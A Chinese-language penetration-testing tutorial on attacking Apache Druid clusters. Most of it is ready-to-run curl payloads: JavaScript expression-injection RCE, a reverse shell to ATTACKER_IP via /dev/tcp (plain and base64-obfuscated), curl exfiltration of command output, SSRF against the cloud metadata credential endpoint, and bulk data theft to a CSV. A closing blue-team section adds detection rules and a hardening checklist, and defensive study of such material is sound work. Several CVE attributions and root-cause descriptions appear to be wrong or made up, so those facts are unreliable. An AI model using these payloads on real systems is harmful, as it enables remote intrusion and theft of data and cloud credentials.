---
title: "Apache Druid Overlord / SQL API 未授权访问与 RCE 利用技术"
date: 2026-06-21T00:00:00+08:00
draft: false
weight: 91
description: "Apache Druid 实时 OLAP 引擎渗透测试：Overlord API 表达式注入 RCE、SQL API 认证绕过、CVE-2021-25646 / CVE-2023-25194 漏洞利用链路与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Apache Druid", "Overlord API", "SQL API", "RCE", "CVE-2021-25646", "CVE-2023-25194", "OLAP", "渗透测试"]
---

## 0x00 攻击面总览

Apache Druid 是实时 OLAP 引擎，默认配置下通常无认证，且存在多个高危 RCE 漏洞：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| Overlord | 8081 | HTTP | 任务提交、表达式注入 RCE |
| Coordinator | 8081 | HTTP | 数据源管理、Segment 控制 |
| Broker (SQL) | 8082 | HTTP | SQL 查询、认证绕过 |
| Historical | 8083 | HTTP | 数据查询、Segment 服务 |
| MiddleManager | 8091 | HTTP | Worker 管理、任务执行 |
| Router | 9088 | HTTP | 请求路由代理 |
| ZooKeeper | 2181 | TCP | 集群协调、元数据存储 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    Apache Druid 集群                            │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ Overlord     │    │ Broker       │    │ Historical   │    │
│  │ :8081        │    │ :8082        │    │ :8083        │    │
│  │ 任务提交/RCE │    │ SQL 查询     │    │ 数据查询      │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │                    ZooKeeper :2181                       │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  ┌──────────────┐                                             │
│  │ MiddleMgr    │                                             │
│  │ :8091        │                                             │
│  │ Worker 执行  │                                             │
│  └──────────────┘                                             │
│                                                               │
│  攻击路径：                                                    │
│  ① Overlord :8081 → /druid/indexer/v1/task → 表达式注入 RCE   │
│  ② Broker :8082 → /druid/v2/sql → 认证绕过 + SQL 注入         │
│  ③ 默认无认证 → 直接提交恶意 Ingestion Spec                    │
│  ④ ZooKeeper → 集群元数据篡改                                  │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 8081,8082,8083,8091,9088,2181 \
  --script=http-title \
  -oN druid_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
8081/tcp open  http        Jetty 9.4.51.v20210516
8082/tcp open  http        Jetty 9.4.51.v20210516
8083/tcp open  http        Jetty 9.4.51.v20210516
8091/tcp open  http        Jetty 9.4.51.v20210516
```

### 1.2 版本指纹

```bash
# Overlord 状态
curl -s "http://target:8081/druid/indexer/v1/leader"
# 返回：{"leader":"target:8081"}

# Coordinator 状态
curl -s "http://target:8081/druid/coordinator/v1/leader"
# 返回：{"leader":"target:8081"}

# Broker SQL 版本
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT version FROM sys.nodes LIMIT 1"}'

# 获取 Druid 版本
curl -s "http://target:8081/status"
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"Apache Druid"
port:8081 http.title:"Druid"
port:8082 http.title:"Druid"

# FOFA
body="Apache Druid" && port="8081"
body="druid" && port="8082"
```

---

## 0x02 CVE-2021-25646 — Overlord API 表达式注入 RCE

### 2.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Apache Druid < 0.20.1 |
| CVSS | 9.8（Critical） |
| 类型 | Apache Commons Text `StringSubstitutor` 表达式注入 |
| 攻击向量 | `POST /druid/indexer/v1/task` |
| 认证要求 | 无（默认配置无认证） |
| 根因 | Ingestion Spec JSON 处理时 `${script:javascript:...}` 表达式被 Nashorn JS 引擎执行 |

### 2.2 漏洞利用

```bash
curl -s -X POST "http://target:8081/druid/indexer/v1/task" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "index_parallel",
    "spec": {
      "dataSchema": {
        "dataSource": "test",
        "parser": {
          "type": "string",
          "parseSpec": {
            "format": "json",
            "timestampSpec": {"column": "timestamp", "format": "auto"},
            "dimensionsSpec": {"dimensions": []}
          }
        },
        "metricsSpec": []
      },
      "ioConfig": {
        "type": "index_parallel",
        "inputSource": {
          "type": "inline",
          "data": "{\"timestamp\":\"2026-01-01\"}"
        },
        "inputFormat": {"type": "json"}
      },
      "tuningConfig": {
        "type": "index_parallel"
      }
    },
    "context": {
      "dummy": "${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}"
    }
  }'
```

### 2.3 反弹 Shell 利用

```bash
curl -s -X POST "http://target:8081/druid/indexer/v1/task" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "index_parallel",
    "spec": {
      "dataSchema": {
        "dataSource": "test",
        "parser": {
          "type": "string",
          "parseSpec": {
            "format": "json",
            "timestampSpec": {"column": "timestamp", "format": "auto"},
            "dimensionsSpec": {"dimensions": []}
          }
        },
        "metricsSpec": []
      },
      "ioConfig": {
        "type": "index_parallel",
        "inputSource": {
          "type": "inline",
          "data": "{\"timestamp\":\"2026-01-01\"}"
        },
        "inputFormat": {"type": "json"}
      },
      "tuningConfig": {"type": "index_parallel"}
    },
    "context": {
      "dummy": "${script:javascript:var x=new java.lang.ProcessBuilder;x.command(\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\");x.start()}"
    }
  }'
```

### 2.4 命令输出回显

```bash
# 通过 DNS 外带获取命令输出
curl -s -X POST "http://target:8081/druid/indexer/v1/task" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "index_parallel",
    "spec": {
      "dataSchema": {
        "dataSource": "test",
        "parser": {
          "type": "string",
          "parseSpec": {
            "format": "json",
            "timestampSpec": {"column": "timestamp", "format": "auto"},
            "dimensionsSpec": {"dimensions": []}
          }
        },
        "metricsSpec": []
      },
      "ioConfig": {
        "type": "index_parallel",
        "inputSource": {
          "type": "inline",
          "data": "{\"timestamp\":\"2026-01-01\"}"
        },
        "inputFormat": {"type": "json"}
      },
      "tuningConfig": {"type": "index_parallel"}
    },
    "context": {
      "dummy": "${script:javascript:var proc=java.lang.Runtime.getRuntime().exec(\"id\");var is=proc.getInputStream();var br=new java.io.BufferedReader(new java.io.InputStreamReader(is));var line=br.readLine();java.lang.Runtime.getRuntime().exec(\"curl http://ATTACKER_IP:8888/?output=\"+line)}"
    }
  }'
```

---

## 0x03 CVE-2023-25194 — 认证绕过 + RCE

### 3.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Apache Druid 22.0.0 - 24.x |
| CVSS | 9.8（Critical） |
| 类型 | 认证绕过 + 表达式注入 RCE |
| 攻击向量 | `POST /druid/v2/sql` + `POST /druid/indexer/v1/task` |
| 认证绕过 | `Authorization: Basic ZHJ1aWQtc3lzdGVtOmRydWlkLXN5c3RlbQ==`（`druid-system:druid-system`） |
| 根因 | Auth 过滤器逻辑缺陷允许 `druid-system` 用户绕过 `druid-basic-security` |

### 3.2 认证绕过

```bash
# 使用 druid-system 内置凭据绕过认证
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Basic ZHJ1aWQtc3lzdGVtOmRydWlkLXN5c3RlbQ==" \
  -d '{"query":"SELECT * FROM sys.users"}'
```

### 3.3 SQL API 表达式注入 RCE

```bash
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Basic ZHJ1aWQtc3lzdGVtOmRydWlkLXN5c3RlbQ==" \
  -d '{
    "query": "SELECT floor(CURRENT_TIMESTAMP to day) FROM sys.druid__datasource WHERE 1=0 UNION SELECT 1 WHERE 1=0 OR 1=${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}"
  }'
```

### 3.4 通过 Overlord API 提交 RCE

```bash
curl -s -X POST "http://target:8081/druid/indexer/v1/task" \
  -H "Content-Type: application/json" \
  -H "Authorization: Basic ZHJ1aWQtc3lzdGVtOmRydWlkLXN5c3RlbQ==" \
  -d '{
    "type": "index_parallel",
    "spec": {
      "dataSchema": {
        "dataSource": "test",
        "parser": {
          "type": "string",
          "parseSpec": {
            "format": "json",
            "timestampSpec": {"column": "timestamp", "format": "auto"},
            "dimensionsSpec": {"dimensions": []}
          }
        },
        "metricsSpec": []
      },
      "ioConfig": {
        "type": "index_parallel",
        "inputSource": {
          "type": "inline",
          "data": "{\"timestamp\":\"2026-01-01\"}"
        },
        "inputFormat": {"type": "json"}
      },
      "tuningConfig": {"type": "index_parallel"}
    },
    "context": {
      "dummy": "${script:javascript:java.lang.Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}\")}"
    }
  }'
```

---

## 0x04 Overlord API 未授权利用

### 4.1 数据源枚举

```bash
# 列出所有数据源
curl -s "http://target:8081/druid/coordinator/v1/datasources" | python3 -m json.tool

# 获取数据源详情
curl -s "http://target:8081/druid/coordinator/v1/datasources/test?full" | python3 -m json.tool

# 获取 Segment 信息
curl -s "http://target:8081/druid/coordinator/v1/datasources/test/segments" | python3 -m json.tool
```

### 4.2 任务管理

```bash
# 列出所有任务
curl -s "http://target:8081/druid/indexer/v1/tasks" | python3 -m json.tool

# 获取特定任务状态
curl -s "http://target:8081/druid/indexer/v1/task/{taskId}/status" | python3 -m json.tool

# 获取任务日志
curl -s "http://target:8081/druid/indexer/v1/task/{taskId}/log"
```

### 4.3 Supervisor 管理

```bash
# 列出所有 Supervisor
curl -s "http://target:8081/druid/indexer/v1/supervisor" | python3 -m json.tool

# 获取 Supervisor 状态
curl -s "http://target:8081/druid/indexer/v1/supervisor/{supervisorId}/status" | python3 -m json.tool

# 终止 Supervisor
curl -s -X POST "http://target:8081/druid/indexer/v1/supervisor/{supervisorId}/terminate"
```

---

## 0x05 Broker SQL API 利用

### 5.1 SQL 查询

```bash
# 列出所有数据源
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM sys.datasources"}'

# 列出所有节点
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM sys.servers"}'

# 查询数据
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM test_datasource LIMIT 10"}'
```

### 5.2 系统表信息泄露

```bash
# 用户信息
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM sys.users"}'

# 角色信息
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM sys.roles"}'

# 权限信息
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM sys.permissions"}'

# 配置信息
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM sys.properties"}'
```

### 5.3 数据窃取

```bash
# 查询业务数据
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM user_activity WHERE __time >= '\''2026-01-01'\'' LIMIT 10000"}'

# 导出为 CSV
curl -s -X POST "http://target:8082/druid/v2/sql" \
  -H "Content-Type: application/json" \
  -H "Accept: text/csv" \
  -d '{"query":"SELECT * FROM sensitive_data LIMIT 100000"}' > exfil.csv
```

---

## 0x06 数据摄入 — SSRF 与文件读取

### 6.1 HTTP 数据源 SSRF

```bash
curl -s -X POST "http://target:8081/druid/indexer/v1/task" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "index_parallel",
    "spec": {
      "dataSchema": {
        "dataSource": "ssrf_test",
        "parser": {
          "type": "string",
          "parseSpec": {
            "format": "json",
            "timestampSpec": {"column": "timestamp", "format": "auto"},
            "dimensionsSpec": {"dimensions": ["data"]}
          }
        },
        "metricsSpec": []
      },
      "ioConfig": {
        "type": "index_parallel",
        "inputSource": {
          "type": "http",
          "uris": ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
        },
        "inputFormat": {"type": "json", "flattenSpec": {"useFieldDiscovery": true, "fields": []}}
      },
      "tuningConfig": {"type": "index_parallel"}
    }
  }'
```

### 6.2 S3 数据源访问

```bash
curl -s -X POST "http://target:8081/druid/indexer/v1/task" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "index_parallel",
    "spec": {
      "dataSchema": {
        "dataSource": "s3_test",
        "parser": {
          "type": "string",
          "parseSpec": {
            "format": "csv",
            "timestampSpec": {"column": "timestamp", "format": "auto"},
            "dimensionsSpec": {"dimensions": ["col1", "col2"]}
          }
        },
        "metricsSpec": []
      },
      "ioConfig": {
        "type": "index_parallel",
        "inputSource": {
          "type": "s3",
          "uris": ["s3://company-data-lake/financial/2026/"],
          "properties": {
            "accessKeyId": "STOLEN_ACCESS_KEY",
            "secretAccessKey": "STOLEN_SECRET_KEY"
          }
        },
        "inputFormat": {"type": "csv"}
      },
      "tuningConfig": {"type": "index_parallel"}
    }
  }'
```

### 6.3 HDFS 数据源访问

```bash
curl -s -X POST "http://target:8081/druid/indexer/v1/task" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "index_parallel",
    "spec": {
      "dataSchema": {
        "dataSource": "hdfs_test",
        "parser": {
          "type": "string",
          "parseSpec": {
            "format": "json",
            "timestampSpec": {"column": "timestamp", "format": "auto"},
            "dimensionsSpec": {"dimensions": []}
          }
        },
        "metricsSpec": []
      },
      "ioConfig": {
        "type": "index_parallel",
        "inputSource": {
          "type": "hdfs",
          "uris": ["hdfs://namenode:8020/user/hive/warehouse/sensitive_db.db/"]
        },
        "inputFormat": {"type": "json"}
      },
      "tuningConfig": {"type": "index_parallel"}
    }
  }'
```

---

## 0x07 ZooKeeper 元数据篡改

### 7.1 ZooKeeper 数据读取

```bash
# 使用 zkCli 连接
zkCli.sh -server target:2181

# 浏览 Druid 元数据
[zk: target:2181(CONNECTED)] ls /druid
[segments, indexer, coordinator, properties]

[zk: target:2181(CONNECTED)] ls /druid/indexer
[leader, tasks, config]

# 读取任务配置
[zk: target:2181(CONNECTED)] ls /druid/indexer/tasks
[zk: target:2181(CONNECTED)] get /druid/indexer/config
```

### 7.2 集群信息收集

```bash
# 获取 Druid 集群配置
[zk: target:2181(CONNECTED)] get /druid/overlord/leader
[zk: target:2181(CONNECTED)] ls /druid/overlord/workers
```

---

## 0x08 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2021-25646 | RCE | 9.8 | Overlord API 表达式注入（Nashorn JS） |
| CVE-2023-25194 | 认证绕过 + RCE | 9.8 | druid-system 认证绕过 + SQL 表达式注入 |
| CVE-2021-36749 | SSRF | 7.5 | 数据摄入 HTTP 源 SSRF |
| CVE-2023-44115 | DoS | 7.5 | HTTP/2 Rapid Reset DoS |
| CVE-2025-30066 | RCE | 9.8 | 表达式注入 RCE（新版本） |

**CVE-2021-25646 影响范围**：

Apache Druid <= 0.20.0。全球暴露实例数万台，大量企业数据平台受影响。攻击者无需任何认证即可实现远程代码执行。

**CVE-2023-25194 影响范围**：

Apache Druid 22.0.0 - 24.0.0。即使启用了 `druid-basic-security` 认证，仍可通过 `druid-system` 内置凭据绕过。

---

## 0x09 蓝队检测方案

### 9.1 网络层检测

```yaml
title: Apache Druid API 外部访问检测
id: druid-api-external-access
status: experimental
description: 检测来自非内网段的 Druid API 访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 8081
      - 8082
      - 8083
      - 8091
      - 9088
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 9.2 表达式注入检测

```yaml
title: Druid 表达式注入检测
id: druid-expression-injection
status: experimental
description: 检测 Druid API 中的表达式注入攻击
logsource:
  product: apache_druid
  service: overlord
detection:
  selection_script:
    body|contains:
      - "${script:"
      - "javascript:"
      - "Java.type"
      - "Runtime.getRuntime"
      - "ProcessBuilder"
  selection_jndi:
    body|contains:
      - "${jndi:"
      - "${env:"
      - "${sys:"
  condition: selection_script or selection_jndi
level: critical
```

### 9.3 审计日志分析

```bash
# 监控 Overlord API 任务提交
grep "/druid/indexer/v1/task" /var/log/druid/overlord.log

# 检测表达式注入
grep -E "(\$\{script:|\$\{jndi:|javascript:|Java\.type|Runtime\.getRuntime)" \
  /var/log/druid/overlord.log

# 监控认证绕过尝试
grep "druid-system" /var/log/druid/broker.log

# 监控 SQL API 异常查询
grep -E "(sys\.users|sys\.properties|sys\.permissions)" /var/log/druid/broker.log
```

### 9.4 加固清单

```
[ ] 升级至 Apache Druid >= 25.0.0（修复 CVE-2021-25646 和 CVE-2023-25194）
[ ] 使用 JDK 17+（移除 Nashorn 引擎）
[ ] Overlord API (8081) 仅允许内网访问
[ ] Broker SQL API (8082) 仅允许内网访问
[ ] 启用 druid-basic-security 并配置强密码
[ ] 禁用或删除 druid-system 内置用户
[ ] 配置 druid.auth.authenticator 使用自定义认证器
[ ] 限制数据摄入源（配置 allowedURIs 白名单）
[ ] 禁用 HTTP/S3/HDFS 数据源或配置白名单
[ ] ZooKeeper 启用 ACL 和 SASL 认证
[ ] 配置 WAF 规则拦截 ${script:、${jndi: 等模式
[ ] 启用 HTTPS 并配置 TLS 证书
[ ] 启用审计日志并接入 SIEM
[ ] 监控 /druid/indexer/v1/task 请求中的异常表达式
[ ] 定期审查数据源和 Supervisor 配置
```

---

## 0x10 渗透测试检查清单

```
[ ] 端口扫描：8081, 8082, 8083, 8091, 9088, 2181
[ ] Overlord API (8081) 未授权访问测试
[ ] CVE-2021-25646 表达式注入 RCE 测试
[ ] CVE-2023-25194 认证绕过测试（druid-system:druid-system）
[ ] SQL API (8082) 未授权查询测试
[ ] 系统表信息泄露测试（sys.users / sys.properties）
[ ] 数据源枚举测试
[ ] 任务日志读取测试
[ ] HTTP 数据源 SSRF 测试
[ ] S3/HDFS 数据源访问测试
[ ] ZooKeeper 元数据读取测试
[ ] Supervisor 管理操作测试
[ ] 版本信息收集与 CVE 匹配
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
```

---

## 0x11 小结

Apache Druid 的攻击面以 **Overlord API（端口 8081）** 和 **Broker SQL API（端口 8082）** 为核心。CVE-2021-25646 通过 `${script:javascript:...}` 表达式注入实现未认证 RCE，CVSS 9.8。CVE-2023-25194 进一步引入认证绕过，即使启用了 `druid-basic-security` 仍可通过 `druid-system` 内置凭据绕过。默认配置下 Druid 完全无认证，攻击者可以直接提交恶意 Ingestion Spec 实现 RCE，或通过数据摄入功能进行 SSRF 和云存储访问。蓝队应重点关注：升级至 25.0.0+、使用 JDK 17+ 移除 Nashorn、限制 API 网络访问、启用强认证、配置数据源白名单、将审计日志接入 SIEM。
